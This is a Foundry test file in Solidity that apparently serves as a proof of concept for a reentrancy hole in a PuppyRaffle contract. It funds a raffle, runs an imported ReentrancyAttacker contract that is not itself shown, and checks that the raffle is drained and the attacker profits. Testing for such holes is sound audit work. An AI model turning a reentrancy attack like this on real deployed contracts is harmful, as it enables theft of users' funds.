// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttacker} from "./ReentrancyAttacker.t.sol";

contract PuppyRaffleReentrancyTest is Test {
    PuppyRaffle public puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);

        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }

    function test_reentrancy_drains_contract() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), entranceFee * 2);

        uint256 balanceBefore = address(puppyRaffle).balance;
        attacker.attack{value: entranceFee}();
        uint256 balanceAfter = address(puppyRaffle).balance;

        assertLt(balanceAfter, entranceFee); // raffle drained
        assertGt(address(attacker).balance, entranceFee); // attacker profited: theft, not just drain
        assertLt(balanceAfter, balanceBefore);
    }
}
